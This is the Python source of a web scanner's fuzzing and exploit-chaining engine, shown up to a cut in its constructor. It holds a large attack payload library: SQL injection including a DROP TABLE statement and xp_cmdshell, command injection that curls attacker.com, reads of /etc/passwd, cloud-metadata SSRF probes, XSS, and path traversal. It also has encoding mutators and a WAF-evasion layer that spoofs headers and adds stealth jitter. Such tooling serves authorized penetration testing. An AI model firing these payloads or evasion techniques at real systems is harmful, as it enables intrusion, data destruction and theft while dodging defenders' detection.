"""
modules/fuzz_engine.py — Plasma v3
─────────────────────────────────────
Context-Aware Fuzzing & Exploit Generation Engine.

Architecture
────────────
  FuzzEngine (orchestrator)
    ├── ContextAnalyzer      — infer endpoint context, classify params
    ├── PayloadMatrix        — generate tailored, mutated, polymorphic payloads
    ├── EvasionLayer         — per-probe encoding, UA rotation, timing, chunking
    ├── ExploitChainer       — chain findings into multi-step attack sequences
    └── FeedbackLoop         — adaptive payload evolution based on responses

Key design decisions
────────────────────
  • BaseDetector-compatible: FuzzEngine is not a detector itself; it is a
    scan phase (called from ScanManager._phase_fuzz) that runs ALL vuln types.
  • Pure additive: ScanManager._phase_fuzz is only called when
    ScanSettings.enable_fuzzer is True. Zero changes to existing detection.
  • Thread-safe: all shared state uses threading.Lock; async probes run in
    executor pools to avoid blocking the event loop.
  • Plugin-ready: FuzzEngine.register_plugin() accepts any callable that
    follows the FuzzPluginProtocol signature.

Usage
─────
    # From scan pipeline (automatic via --fuzz flag):
    engine = FuzzEngine(context)
    await engine.run()

    # Standalone API:
    from modules.fuzz_engine import FuzzEngine, ContextAnalyzer, PayloadMatrix
    matrix = PayloadMatrix(profile="aggressive")
    payloads = matrix.generate("sqli", endpoint)
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import html
import logging
import random
import re
import threading
import time
import urllib.parse
from collections import defaultdict, deque
from dataclasses import dataclass, field
from typing import Any, Callable, Optional, Protocol

import requests

from config import (
    FUZZ_CHAIN_DEPTH,
    FUZZ_CONCURRENCY,
    FUZZ_FEEDBACK_WINDOW,
    FUZZ_LOG_EVASION_METRICS,
    FUZZ_MAX_MUTATIONS,
    FUZZ_STEALTH_JITTER,
    FUZZ_WAF_DETECT_THRESH,
    MAX_RETRIES,
)
from core.models import (
    Confidence, Endpoint, Evidence, Finding,
    ScanContext, Severity, VulnType,
)
from utils.http_client import make_session

log = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Protocol: FuzzPlugin
# ─────────────────────────────────────────────────────────────────────────────

class FuzzPluginProtocol(Protocol):
    """
    Type contract for fuzzing plugins.

    A plugin is any callable that accepts (endpoint, context, payload_matrix)
    and returns a list of (payload_str, technique_label) tuples.

    Example plugin:

        def my_plugin(endpoint, context, matrix):
            return [("' OR SLEEP(5)--", "sqli:time-custom")]

    Register with: engine.register_plugin(my_plugin)
    """
    def __call__(
        self,
        endpoint: Endpoint,
        context:  ScanContext,
        matrix:   "PayloadMatrix",
    ) -> list[tuple[str, str]]:
        ...


# ─────────────────────────────────────────────────────────────────────────────
# ContextAnalyzer — endpoint introspection
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class EndpointContext:
    """
    Inferred characteristics of an endpoint, used to select payloads.

    Fields
    ------
    vuln_types  : ordered list of likely vulnerability types (most likely first)
    param_roles : {param_name: "id" | "path" | "cmd" | "url" | "search" | "generic"}
    has_numeric_params : True if any param value looks like a numeric ID
    is_api      : True if Content-Type is JSON or URL contains /api/
    is_file_param: True if any param name suggests a file path
    inferred_db  : "mysql" | "pgsql" | "sqlite" | "mssql" | None
    """
    vuln_types:          list[VulnType]
    param_roles:         dict[str, str]
    has_numeric_params:  bool
    is_api:              bool
    is_file_param:       bool
    inferred_db:         Optional[str]


class ContextAnalyzer:
    """
    Stateless analyser.  Inspects URL, parameters, headers, and method to
    infer which vulnerability classes are most likely and how to focus payloads.

    Caches results keyed on (url, sorted_params) to avoid re-analysis across
    concurrent probes.
    """

    _cache:     dict[str, EndpointContext] = {}
    _cache_lock: threading.Lock            = threading.Lock()

    # ── Heuristic patterns ────────────────────────────────────────────────────

    _ID_PARAM_RE     = re.compile(r"\b(id|uid|user_id|item|product|order|record|doc)\b", re.I)
    _CMD_PARAM_RE    = re.compile(r"\b(cmd|command|exec|run|ping|shell|process)\b", re.I)
    _PATH_PARAM_RE   = re.compile(r"\b(file|path|page|include|dir|folder|load|template)\b", re.I)
    _URL_PARAM_RE    = re.compile(r"\b(url|uri|src|redirect|next|dest|target|href|link)\b", re.I)
    _SEARCH_PARAM_RE = re.compile(r"\b(q|search|query|find|filter|keyword|term|s)\b", re.I)
    _DB_HINT_RE      = re.compile(r"\b(mysql|postgres|sqlite|mssql|oracle|mariadb)\b", re.I)
    _API_URL_RE      = re.compile(r"/(api|v\d+|rest|graphql)/", re.I)

    @classmethod
    def analyze(cls, endpoint: Endpoint) -> EndpointContext:
        """
        Analyze endpoint and return cached EndpointContext.
        Thread-safe via lock on the shared cache.
        """
        cache_key = cls._cache_key(endpoint)
        with cls._cache_lock:
            if cache_key in cls._cache:
                return cls._cache[cache_key]

        ctx = cls._compute(endpoint)
        with cls._cache_lock:
            cls._cache[cache_key] = ctx
        return ctx

    @classmethod
    def _cache_key(cls, endpoint: Endpoint) -> str:
        params_str = ",".join(sorted(endpoint.parameters.keys()))
        return hashlib.md5(f"{endpoint.url}|{endpoint.method}|{params_str}".encode()).hexdigest()

    @classmethod
    def _compute(cls, endpoint: Endpoint) -> EndpointContext:
        params     = endpoint.parameters
        url        = endpoint.url.lower()
        method     = (endpoint.method or "GET").upper()
        headers    = {k.lower(): v for k, v in endpoint.headers.items()}
        ct         = headers.get("content-type", "")

        # ── Param-role classification ─────────────────────────────────────────
        param_roles: dict[str, str] = {}
        has_numeric   = False
        is_file_param = False

        for name, value in params.items():
            n = name.lower()
            if cls._ID_PARAM_RE.search(n):
                param_roles[name] = "id"
            elif cls._CMD_PARAM_RE.search(n):
                param_roles[name] = "cmd"
            elif cls._PATH_PARAM_RE.search(n):
                param_roles[name] = "path"
                is_file_param = True
            elif cls._URL_PARAM_RE.search(n):
                param_roles[name] = "url"
            elif cls._SEARCH_PARAM_RE.search(n):
                param_roles[name] = "search"
            else:
                param_roles[name] = "generic"

            if value and re.match(r"^\d+$", str(value)):
                has_numeric = True

        # ── Vuln-type priority list ────────────────────────────────────────────
        vuln_types: list[VulnType] = []
        has_cmd  = any(r == "cmd"    for r in param_roles.values())
        has_path = any(r == "path"   for r in param_roles.values())
        has_url  = any(r == "url"    for r in param_roles.values())
        has_id   = any(r == "id"     for r in param_roles.values())
        has_srch = any(r == "search" for r in param_roles.values())

        if has_cmd:
            vuln_types.append(VulnType.RCE)
        if has_path:
            vuln_types.append(VulnType.DIR_TRAVERSAL)
        if has_url:
            vuln_types.append(VulnType.SSRF)
            vuln_types.append(VulnType.OPEN_REDIRECT)
        if has_id or has_numeric:
            vuln_types.append(VulnType.IDOR)
        if has_srch or method in ("GET", "POST"):
            vuln_types.append(VulnType.SQLI)
            vuln_types.append(VulnType.XSS)
        if method in ("POST", "PUT", "PATCH"):
            vuln_types.append(VulnType.CSRF)

        # Always include common ones as fallback
        for vt in (VulnType.SQLI, VulnType.XSS, VulnType.SSRF):
            if vt not in vuln_types:
                vuln_types.append(vt)

        # ── API detection ──────────────────────────────────────────────────────
        is_api = bool(cls._API_URL_RE.search(url)) or "json" in ct

        # ── DB hint from URL/tech ──────────────────────────────────────────────
        inferred_db = None
        m = cls._DB_HINT_RE.search(url)
        if m:
            inferred_db = m.group(0).lower()

        return EndpointContext(
            vuln_types=vuln_types,
            param_roles=param_roles,
            has_numeric_params=has_numeric,
            is_api=is_api,
            is_file_param=is_file_param,
            inferred_db=inferred_db,
        )


# ─────────────────────────────────────────────────────────────────────────────
# PayloadMatrix — tailored + polymorphic payload generation
# ─────────────────────────────────────────────────────────────────────────────

# Extended built-in payload library (supplements core/evasion/payloads.py)
_FUZZ_PAYLOAD_DB: dict[str, dict[str, list[str]]] = {
    "sqli": {
        "error": [
            "'", '"', "';", "\" --", "') --",
            "' OR '1'='1", "' OR 1=1--", "1' ORDER BY 1--",
            "1' ORDER BY 100--", "1 UNION SELECT NULL--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "time": [
            "' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
            "' OR pg_sleep(3)--", "1; SELECT SLEEP(3)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        ],
        "union": [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT @@version,NULL--",
            "' UNION ALL SELECT NULL,table_name FROM information_schema.tables--",
        ],
        "boolean": [
            "' AND 1=1--", "' AND 1=2--",
            "' AND SUBSTRING(version(),1,1)='5'--",
        ],
        "stacked": [
            "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hacked','hacked')--",
            "'; EXEC xp_cmdshell('whoami')--",
        ],
        "oob": [
            "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'\\\\test.txt'))--",
            "'; EXEC master.dbo.xp_dirtree '//attacker.com/share'--",
        ],
    },
    "xss": {
        "reflected": [
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "javascript:alert(1)",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<math><mtext></p><script>alert(1)</script>",
            "'-alert(1)-'", "\"-alert(1)-\"",
        ],
        "dom": [
            "#<img src=x onerror=alert(1)>",
            "?x=</script><script>alert(1)</script>",
            "data:text/html,<script>alert(1)</script>",
        ],
        "csp_bypass": [
            "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
            "<script src='data:,alert(1)'></script>",
            "<iframe sandbox='allow-scripts' src='data:text/html,<script>alert(1)</script>'>",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
            "'\"><img src=x:x onerror=alert(1)>",
        ],
    },
    "rce": {
        "unix": [
            "; id", "| id", "`id`", "$(id)",
            "; sleep 3", "| sleep 3", "`sleep 3`",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; whoami", "| whoami",
            "; ls -la /", "$(ls /)",
            "; curl http://attacker.com/`id`",
            "${IFS}id",                          # IFS bypass
            "a;id;b", "a|id|b",
        ],
        "windows": [
            "& whoami", "| whoami", "& dir C:\\",
            "& echo PLRCE", "| echo PLRCE",
            "cmd /c whoami", "cmd.exe /c whoami",
            "& ping -n 1 attacker.com",
            "%0aid", "%0Awhoami",
        ],
        "template": [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",  # SSTI
            "{{config}}", "{{self._TemplateReference__context.keys()}}",
        ],
    },
    "ssrf": {
        "internal": [
            "http://127.0.0.1/", "http://localhost/",
            "http://0.0.0.0/", "http://[::1]/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        ],
        "bypass": [
            "http://127.1/", "http://0177.0.0.1/",
            "http://0x7f000001/", "http://2130706433/",
            "http://127.0.0.1.xip.io/",
            "http://localtest.me/",
            "http://①②⑦.⓪.⓪.①/",  # Unicode IP
        ],
        "protocol": [
            "file:///etc/passwd", "file:///c:/windows/win.ini",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/info",
            "ftp://127.0.0.1:21/",
        ],
    },
    "directory_traversal": {
        "unix": [
            "../etc/passwd", "../../etc/passwd",
            "../../../etc/passwd", "../../../../etc/passwd",
            "%2e%2e%2fetc%2fpasswd", "..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",           # double-dot bypass
            "..%252Fetc%252Fpasswd",             # double-encoded
            "%252e%252e%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
        ],
        "windows": [
            "..\\windows\\win.ini", "..\\..\\windows\\win.ini",
            "%2e%2e%5cwindows%5cwin.ini",
            "..%255cwindows%255cwin.ini",
        ],
    },
    "idor": {
        "numeric": ["0", "1", "2", "100", "999", "-1", "9999", "00001", "1337"],
        "uuid":    [
            "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002",
        ],
        "string":  ["admin", "root", "administrator", "superuser", "test"],
        "mass_assign": ["is_admin=1", "role=admin", "privilege=superuser"],
    },
    "open_redirect": {
        "basic": [
            "https://evil.com", "//evil.com", "/\\evil.com",
            "https:evil.com", "javascript:alert(1)",
            "data:text/html,<script>window.location='https://evil.com'</script>",
            "%2F%2Fevil.com", "%5C%5Cevil.com",
        ],
    },
}


class PayloadMatrix:
    """
    Generates tailored, mutated, and polymorphic payloads for a given
    vuln type and endpoint context.

    Caches mutation results to avoid re-computing identical encodings.
    Thread-safe; all cache access is guarded by _lock.
    """

    _mutation_cache:  dict[str, list[str]] = {}
    _lock:            threading.Lock        = threading.Lock()

    def __init__(self, profile: str = "default", max_mutations: int = FUZZ_MAX_MUTATIONS) -> None:
        self.profile       = profile
        self.max_mutations = max_mutations
        self._plugins: list[FuzzPluginProtocol] = []

    # ── Public API ─────────────────────────────────────────────────────────────

    def register_plugin(self, plugin: FuzzPluginProtocol) -> None:
        """Register a custom payload plugin (callable)."""
        self._plugins.append(plugin)
        log.debug("[fuzz] registered plugin: %s", getattr(plugin, "__name__", repr(plugin)))

    def generate(
        self,
        vuln_type: VulnType,
        endpoint:  Endpoint,
        context:   Optional[EndpointContext] = None,
    ) -> list[tuple[str, str, str]]:
        """
        Generate payloads for a specific vuln type.

        Returns list of (payload_str, param_name, technique_label) triples.
        param_name is the target parameter determined by context analysis.
        """
        vt_key   = _VULN_TYPE_KEY.get(vuln_type, "")
        db       = _FUZZ_PAYLOAD_DB.get(vt_key, {})
        ctx      = context or EndpointContext(
            vuln_types=[], param_roles={}, has_numeric_params=False,
            is_api=False, is_file_param=False, inferred_db=None,
        )

        # Select best target parameter for this vuln type
        target_param = self._select_param(vuln_type, endpoint, ctx)

        results: list[tuple[str, str, str]] = []
        for technique, payloads in db.items():
            for raw in payloads:
                for mutated, label in self._mutate(raw, technique):
                    results.append((mutated, target_param, f"{vt_key}:{label}"))
                    if len(results) >= self.max_mutations:
                        return results

        # Plugin contributions
        for plugin in self._plugins:
            try:
                for payload, label in plugin(endpoint, None, self):  # type: ignore[arg-type]
                    results.append((payload, target_param, label))
            except Exception as exc:
                log.debug("[fuzz] plugin error: %s", exc)

        return results

    def generate_all(
        self,
        endpoint: Endpoint,
        ctx:      Optional[EndpointContext] = None,
    ) -> list[tuple[str, str, str, VulnType]]:
        """
        Generate payloads for all relevant vuln types (context-aware ordering).

        Returns list of (payload, param_name, technique_label, vuln_type).
        """
        ec      = ctx or ContextAnalyzer.analyze(endpoint)
        results: list[tuple[str, str, str, VulnType]] = []
        for vt in ec.vuln_types:
            for payload, param, label in self.generate(vt, endpoint, ec):
                results.append((payload, param, label, vt))
        return results

    def polymorphic(self, payload: str) -> list[str]:
        """
        Return all encoding variants of a payload (polymorphic set).
        Result is cached by payload content hash.
        """
        key = hashlib.md5(payload.encode()).hexdigest()
        with self._lock:
            if key in self._mutation_cache:
                return self._mutation_cache[key]

        variants = list({
            payload,
            urllib.parse.quote(payload, safe=""),
            urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),  # double-encode
            html.escape(payload),
            base64.b64encode(payload.encode()).decode(),
            _unicode_escape(payload),
            _hex_encode(payload),
            _case_swap(payload),
            _insert_null(payload),
            _comment_inject(payload),
        })

        with self._lock:
            self._mutation_cache[key] = variants
        return variants

    # ── Internal helpers ───────────────────────────────────────────────────────

    def _mutate(self, raw: str, technique: str) -> list[tuple[str, str]]:
        """Return list of (mutated_payload, label) tuples for a raw payload."""
        if self.profile in ("aggressive",):
            variants = self.polymorphic(raw)
            return [(v, f"{technique}:{_encoding_label(v, raw)}") for v in variants]
        if self.profile == "stealth":
            chosen = random.choice(self.polymorphic(raw))
            return [(chosen, f"{technique}:stealth")]
        return [(raw, technique)]

    @staticmethod
    def _select_param(
        vuln_type: VulnType,
        endpoint:  Endpoint,
        ctx:       EndpointContext,
    ) -> str:
        """Choose the best target parameter name for a given vuln type."""
        role_map = {
            VulnType.RCE:           "cmd",
            VulnType.DIR_TRAVERSAL: "path",
            VulnType.SSRF:          "url",
            VulnType.OPEN_REDIRECT: "url",
            VulnType.IDOR:          "id",
        }
        preferred_role = role_map.get(vuln_type, "search")
        for name, role in ctx.param_roles.items():
            if role == preferred_role:
                return name
        # Fallback: first param, or empty string for URL-only endpoints
        return next(iter(endpoint.parameters), "q")


# Vuln type → payload DB key
_VULN_TYPE_KEY: dict[VulnType, str] = {
    VulnType.SQLI:          "sqli",
    VulnType.XSS:           "xss",
    VulnType.RCE:           "rce",
    VulnType.SSRF:          "ssrf",
    VulnType.DIR_TRAVERSAL: "directory_traversal",
    VulnType.IDOR:          "idor",
    VulnType.OPEN_REDIRECT: "open_redirect",
}


# ── Encoding helpers (used by polymorphic()) ──────────────────────────────────

def _unicode_escape(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 or c in "\"'<>" else c for c in s)

def _hex_encode(s: str) -> str:
    return "".join(f"%{ord(c):02X}" if c in "\"'<>&;|`$(){}" else c for c in s)

def _case_swap(s: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

def _insert_null(s: str) -> str:
    """Insert null byte between first two chars if possible."""
    if len(s) < 2:
        return s
    return s[0] + "%00" + s[1:]

def _comment_inject(s: str) -> str:
    """Insert SQL comment into keywords."""
    for kw in ("SELECT", "UNION", "WHERE", "FROM", "INSERT", "UPDATE"):
        if kw.lower() in s.lower():
            pos = s.lower().index(kw.lower())
            half = len(kw) // 2
            s = s[:pos + half] + "/**/" + s[pos + half:]
            break
    return s

def _encoding_label(mutated: str, original: str) -> str:
    if mutated == original:                    return "raw"
    if "%25" in mutated:                       return "double-url"
    if "&#" in mutated or "&quot;" in mutated: return "html-entity"
    if re.match(r"^[A-Za-z0-9+/=]+$", mutated): return "base64"
    if "\\u" in mutated:                       return "unicode"
    if "/**/" in mutated:                      return "sql-comment"
    if "%00" in mutated:                       return "null-byte"
    return "encoded"


# ─────────────────────────────────────────────────────────────────────────────
# EvasionLayer — per-probe request manipulation
# ─────────────────────────────────────────────────────────────────────────────

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/8.4.0", "python-requests/2.31.0",
]

_DECOY_HEADERS = [
    ("X-Forwarded-For",    lambda: f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"),
    ("X-Real-IP",          lambda: f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"),
    ("Accept-Language",    lambda: random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.7"])),
    ("X-Request-ID",       lambda: hashlib.md5(str(time.time()).encode()).hexdigest()[:16]),
    ("Accept-Encoding",    lambda: random.choice(["gzip, deflate", "br", "identity"])),
]


class EvasionLayer:
    """
    Applies per-probe evasion transforms:
      - User-Agent rotation
      - Decoy / spoofed headers
      - Timing jitter
      - Chunked transfer encoding hint (header only; actual chunking is server-side)
      - Payload encoding (delegated to PayloadMatrix.polymorphic)

    Tracks per-session evasion metrics for adaptive feedback.
    """

    def __init__(self, profile: str = "default", stealth: bool = False) -> None:
        self.profile  = profile
        self.stealth  = stealth
        self._metrics = defaultdict(int)   # label -> count
        self._lock    = threading.Lock()

    def build_headers(self, base: dict[str, str]) -> dict[str, str]:
        """Return request headers with evasion applied."""
        h = dict(base)

        # UA rotation
        if self.profile in ("aggressive", "stealth") or self.stealth:
            h["User-Agent"] = random.choice(_UA_POOL)

        # Decoy headers (aggressive / stealth only)
        if self.profile == "aggressive" or self.stealth:
            num_decoys = random.randint(1, 3)
            for key, gen in random.sample(_DECOY_HEADERS, min(num_decoys, len(_DECOY_HEADERS))):
                h[key] = gen()

        # Chunked encoding hint (some WAFs inspect Content-Length differently)
        if self.profile == "aggressive":
            h["Transfer-Encoding"] = "chunked"

        self._record("headers_built")
        return h

    async def jitter(self) -> None:
        """Apply timing jitter appropriate to the profile."""
        if self.stealth or self.profile == "stealth":
            lo, hi = FUZZ_STEALTH_JITTER
        elif self.profile == "aggressive":
            lo, hi = 0.0, 0.05
        else:
            lo, hi = 0.1, 0.4
        delay = random.uniform(lo, hi)
        if delay > 0:
            await asyncio.sleep(delay)

    def log_evasion_metric(self, label: str, success: bool) -> None:
        """Record whether a given evasion technique produced a notable response."""
        key = f"{label}:{'hit' if success else 'miss'}"
        self._record(key)

    def get_metrics(self) -> dict[str, int]:
        with self._lock:
            return dict(self._metrics)

    def _record(self, key: str) -> None:
        with self._lock:
            self._metrics[key] += 1


# ─────────────────────────────────────────────────────────────────────────────
# FeedbackLoop — adaptive payload evolution
# ─────────────────────────────────────────────────────────────────────────────

class FeedbackLoop:
    """
    Sliding-window feedback loop that tracks which encoding/technique labels
    produce notable HTTP responses (2xx or non-baseline).

    After each probe:
      loop.record(label, notable=True/False)

    Query:
      loop.top_techniques(n=5)  -> [("sqli:error:raw", score), ...]

    The fuzzer uses this to front-load high-scoring techniques in subsequent
    probes, implementing a simple multi-armed bandit strategy.
    """

    def __init__(self, window: int = FUZZ_FEEDBACK_WINDOW) -> None:
        self._window  = window
        self._history: deque[tuple[str, bool]] = deque(maxlen=window)
        self._scores:  defaultdict[str, float] = defaultdict(float)
        self._counts:  defaultdict[str, int]   = defaultdict(int)
        self._lock     = threading.Lock()

    def record(self, label: str, notable: bool) -> None:
        with self._lock:
            self._history.append((label, notable))
            self._counts[label] += 1
            # Exponential moving average: new = old * 0.9 + result * 0.1
            self._scores[label] = self._scores[label] * 0.9 + (1.0 if notable else 0.0) * 0.1

    def top_techniques(self, n: int = 5) -> list[tuple[str, float]]:
        with self._lock:
            return sorted(self._scores.items(), key=lambda x: x[1], reverse=True)[:n]

    def should_prioritize(self, label: str) -> bool:
        with self._lock:
            return self._scores.get(label, 0.0) > 0.3

    def reset(self) -> None:
        with self._lock:
            self._history.clear()
            self._scores.clear()
            self._counts.clear()


# ─────────────────────────────────────────────────────────────────────────────
# WAF Detector — confidence-scored heuristic
# ─────────────────────────────────────────────────────────────────────────────

_WAF_SIGNATURES = {
    "cloudflare":   ["cloudflare", "cf-ray", "__cfduid"],
    "akamai":       ["akamai", "x-check-cacheable", "x-akamai"],
    "aws_waf":      ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw"],
    "modsecurity":  ["mod_security", "modsecurity", "nsg-err-code", "x-webknight"],
    "sucuri":       ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
    "generic_403":  ["forbidden", "blocked", "access denied", "waf", "firewall"],
}

class WAFDetector:
    """
    Heuristic WAF detection based on response headers and body.
    Returns (detected: bool, waf_name: str | None, confidence: float).
    """

    @staticmethod
    def detect(response: requests.Response) -> tuple[bool, Optional[str], float]:
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        body_lower    = (response.text or "")[:2000].lower()

        scores: dict[str, int] = defaultdict(int)

        for waf, sigs in _WAF_SIGNATURES.items():
            for sig in sigs:
                for h_val in headers_lower.values():
                    if sig in h_val:
                        scores[waf] += 2
                if sig in body_lower:
                    scores[waf] += 1

        # HTTP 429 / 403 with WAF-like body
        if response.status_code in (403, 429):
            if any(kw in body_lower for kw in ("blocked", "firewall", "captcha")):
                scores["generic_403"] += 3

        if not scores:
            return False, None, 0.0

        best = max(scores, key=lambda k: scores[k])
        # Normalise against THIS WAF's own signature count (×3 = full header+body match per sig)
        per_waf_max = len(_WAF_SIGNATURES.get(best, ["x"])) * 3
        conf     = min(scores[best] / max(per_waf_max, 1), 1.0)
        detected = conf >= FUZZ_WAF_DETECT_THRESH
        return detected, best if detected else None, conf


# ─────────────────────────────────────────────────────────────────────────────
# ExploitChainer — chain findings into multi-step attacks
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ChainStep:
    """A single step in an exploit chain."""
    vuln_type:   VulnType
    endpoint:    Endpoint
    payload:     str
    param:       str
    depends_on:  Optional["ChainStep"]  = None  # previous step
    result:      Optional[str]          = None  # output used by next step

@dataclass
class ExploitChain:
    """A complete exploit chain: ordered list of ChainStep."""
    steps:      list[ChainStep]
    chain_type: str   # e.g. "sqli→idor", "ssrf→rce"
    severity:   Severity = Severity.CRITICAL

class ExploitChainer:
    """
    Builds multi-step exploit chains from discovered findings.

    Chain patterns (hard-coded):
      sqli → idor        : Extract IDs from SQLi, use for IDOR
      ssrf → internal    : SSRF probes internal APIs for further escalation
      traversal → lfi    : Path traversal → Local File Inclusion → RCE via log poisoning
      redirect → csrf    : Open Redirect → Host phishing + CSRF token steal

    Usage:
        chainer  = ExploitChainer(max_depth=FUZZ_CHAIN_DEPTH)
        chains   = chainer.build_chains(findings, endpoints)
        findings += chainer.chains_to_findings(chains)
    """

    _CHAIN_PATTERNS: list[tuple[VulnType, VulnType, str]] = [
        (VulnType.SQLI,          VulnType.IDOR,          "sqli→idor"),
        (VulnType.SSRF,          VulnType.RCE,           "ssrf→rce"),
        (VulnType.DIR_TRAVERSAL, VulnType.RCE,           "traversal→lfi→rce"),
        (VulnType.OPEN_REDIRECT, VulnType.CSRF,          "redirect→csrf"),
        (VulnType.XSS,           VulnType.CSRF,          "xss→csrf"),
        (VulnType.IDOR,          VulnType.INFORMATION_DISC, "idor→info-disc"),
        # v3.3: SSTI→RCE OOB confirmation chain
        (VulnType.OTHER,         VulnType.RCE,           "ssti→rce-oob"),
    ]

    def __init__(self, max_depth: int = FUZZ_CHAIN_DEPTH) -> None:
        self.max_depth = max_depth

    def build_chains(
        self,
        findings:  list[Finding],
        endpoints: list[Endpoint],
    ) -> list[ExploitChain]:
        """Build exploit chains from existing findings."""
        chains: list[ExploitChain] = []
        type_to_findings: dict[VulnType, list[Finding]] = defaultdict(list)
        for f in findings:
            type_to_findings[f.vuln_type].append(f)

        for pivot_type, follow_type, chain_name in self._CHAIN_PATTERNS:
            pivots  = type_to_findings.get(pivot_type, [])
            follows = type_to_findings.get(follow_type, [])
            if not pivots:
                continue
            for pivot in pivots[:3]:  # cap to 3 per pattern
                step1 = ChainStep(
                    vuln_type=pivot_type,
                    endpoint=pivot.endpoint or endpoints[0],
                    payload=pivot.evidence.payload_used or "",
                    param=pivot.evidence.request_url,
                )
                if follows:
                    step2 = ChainStep(
                        vuln_type=follow_type,
                        endpoint=follows[0].endpoint or endpoints[0],
                        payload=follows[0].evidence.payload_used or "",
                        param=follows[0].evidence.request_url,
                        depends_on=step1,
                    )
                    chains.append(ExploitChain(
                        steps=[step1, step2], chain_type=chain_name,
                    ))
                else:
                    # Even without confirmed follow-finding, chain is possible
                    chains.append(ExploitChain(steps=[step1], chain_type=chain_name))

        return chains[:self.max_depth]

    @staticmethod
    def chains_to_findings(chains: list[ExploitChain]) -> list[Finding]:
        """Convert exploit chains into Finding objects for reporting."""
        findings: list[Finding] = []
        for chain in chains:
            if len(chain.steps) < 2:
                continue
            s1, s2 = chain.steps[0], chain.steps[1]
            findings.append(Finding(
                vuln_type   = VulnType.OTHER,
                severity    = chain.severity,
                confidence  = Confidence.MEDIUM,
                title       = f"Exploit Chain: {chain.chain_type}",
                description = (
                    f"Exploit chain identified: {chain.chain_type}. "
                    f"Step 1 ({s1.vuln_type.value}) can be leveraged to escalate "
                    f"into Step 2 ({s2.vuln_type.value}). "
                    f"This multi-step attack significantly increases impact."
                ),
                evidence=Evidence(
                    request_url    = s1.endpoint.url if s1.endpoint else "",
                    request_method = "CHAIN",
                    notes          = f"chain={chain.chain_type}  steps={len(chain.steps)}",
                ),
                remediation=(
                    "Address each vulnerability in the chain independently. "
                    "Chained exploits often result in critical severity regardless of "
                    "individual finding severity."
                ),
                endpoint  = s1.endpoint,
                detector  = "fuzz-chain",
                owasp_id  = "A01:2021",
                cwe_id    = "CWE-284",
                tags      = ["exploit-chain", "fuzz", chain.chain_type],
            ))
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# FuzzProbe — single probe data container
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class _RateLimitError(Exception):
    """Raised internally when a 429 response is received; triggers retry back-off."""


@dataclass
class FuzzProbe:
    endpoint:   Endpoint
    param:      str
    payload:    str
    technique:  str
    vuln_type:  VulnType
    headers:    dict[str, str] = field(default_factory=dict)

@dataclass
class FuzzResult:
    probe:         FuzzProbe
    status_code:   int
    response_size: int
    response_time: float
    raw_response:  str
    notable:       bool
    waf_detected:  bool
    waf_name:      Optional[str]


# ─────────────────────────────────────────────────────────────────────────────
# FuzzEngine — main orchestrator
# ─────────────────────────────────────────────────────────────────────────────

class FuzzEngine:
    """
    Orchestrates context-aware fuzzing across all endpoints in a ScanContext.

    Integration with scan pipeline:
        engine = FuzzEngine(context)
        await engine.run()

    This is called by ScanManager._phase_fuzz() only when enable_fuzzer=True.

    Plugin system:
        engine.register_plugin(my_plugin_fn)
        # or from plugin directory:
        engine.load_plugins_from_dir("plugins/")
    """

    def __init__(self, context: ScanContext) -> None:
        self.context      = context
        self.settings     = context.settings
        profile           = getattr(self.settings, "fuzz_profile", self.settings.profile)
